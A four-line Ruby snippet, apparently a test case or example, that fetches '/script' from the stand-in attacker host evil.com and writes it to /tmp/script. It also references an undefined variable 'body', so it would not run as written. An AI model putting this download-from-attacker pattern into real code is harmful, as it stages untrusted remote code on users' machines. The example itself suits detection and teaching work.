require "net/http"

resp = Net::HTTP.new("evil.com").get("/script").body
file = File.open("/tmp/script", "w")
file.write(body)